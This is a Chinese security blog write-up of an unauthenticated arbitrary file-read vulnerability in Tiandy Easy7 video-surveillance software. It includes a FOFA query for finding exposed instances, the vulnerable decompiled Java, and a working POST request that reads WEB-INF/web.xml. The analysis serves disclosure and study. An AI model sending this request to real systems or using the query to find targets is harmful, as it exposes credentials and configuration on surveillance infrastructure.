---
title: "天地伟业Easy7 exportGisObj 文件读取漏洞"
source: https://mrxn.net/jswz/easy7-gis-exportGisObj-file-read.html
asset_dir: assets/天地伟业easy7-exportgisobj-文件读取漏洞
---

# 天地伟业Easy7 exportGisObj 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/5 08:37
- 289浏览
- [0评论](#comment)
- 28分钟阅读

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的[软件](#)系统。

漏洞预警服务

该系统的/Easy7/rest/gis/exportGisObj 和 /Easy7/rest/gisCore/exportGisObj接口存在前台任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者通过构造恶意路径参数（如WEB-INF/web.xml）可读取服务器上的任意文件，可能导致敏感信息泄露（如系统配置文件、用户凭证等）。由于天地伟业产品多用于关键基础设施领域，若存在公网暴露实例，可能带来严重的安全风险。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的漏洞接口 /Easy7/rest/gis/exportGisObj 和 /Easy7/rest/gisCore/exportGisObj （这是审计时额外发现的，漏洞通告只有前者，可能是不同版本的区别）的对应方法`exportGisObj()`的实现逻辑

其中一个路径来自 `com.tiandy.easy7.core.rest.CLS_REST_Gis#exportGisObj`

```
@Controller
@RequestMapping({"/gis"})
public class CLS_REST_Gis {
    @Resource(
        name = "boGis"
    )
    private CLS_BO_Gis boGis;
    static WritableWorkbook wwb;
    @RequestMapping({"/exportGisObj"})
    public void exportGisObj(HttpServletRequest request, HttpServletResponse response, CLS_VO_Obj_ObjGis voObjGisObj) throws Exception {
        String filePath = request.getRealPath("/");
        String fileName = voObjGisObj.getFileName();
        if (null != fileName && !"".equals(fileName)) {
            Tools.outFile(response, fileName, filePath + fileName);
        } else {
            response.getWriter().println(JSONObject.fromObject(this.boGis.exportGisObj(voObjGisObj, filePath)));
        }

    }
```

另一个路径来自 `com.tiandy.easy7.core.rest.CLS_REST_GisCore#exportGisObj` 二者实现是一样的，只是来自不同的接口而已。

计算机科学

其中 `request.getRealPath("/")`获取的结果是当前应用的根目录，`voObjGisObj.getFileName()`返回的是用户传递的`fileName`参数；

其次，根据代码实现逻辑，我们需要跟进 `Tools.outFile()` 方法

```
public static void outFile(HttpServletResponse resp, String fileName, String fileUrl) throws IOException {
        ServletOutputStream out = resp.getOutputStream();
        fileName = URLEncoder.encode(fileName, "UTF-8");
        resp.setHeader("Content-disposition", "attachment;filename=" + fileName);
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;

        try {
            InputStream inputStream = new FileInputStream(fileUrl);
            bis = new BufferedInputStream(inputStream);
            bos = new BufferedOutputStream(out);
            byte[] buff = new byte[2048];

            int bytesRead;
            while((bytesRead = bis.read(buff, 0, buff.length)) != -1) {
                bos.write(buff, 0, bytesRead);
            }
```

到这里，这个文件读取漏洞的成因就非常清楚了：用户请求传递`fileName`参数，被直接拼接到`new FileInputStream(fileUrl)` fileUrl 部分进行文件操作，整个过程无任何校验或过滤，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /Easy7/rest/gis/exportGisObj HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=WEB-INF/web.xml
```

[![天地伟业Easy7 exportGisObj 文件读取漏洞](images/img-001-4b170f3ff8df.webp)](https://image.mrxn.net/eb519b8b10cb43558215a7bb5bd9946b.webp)

成功读取到WEB-INF/web.xml文件内容

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
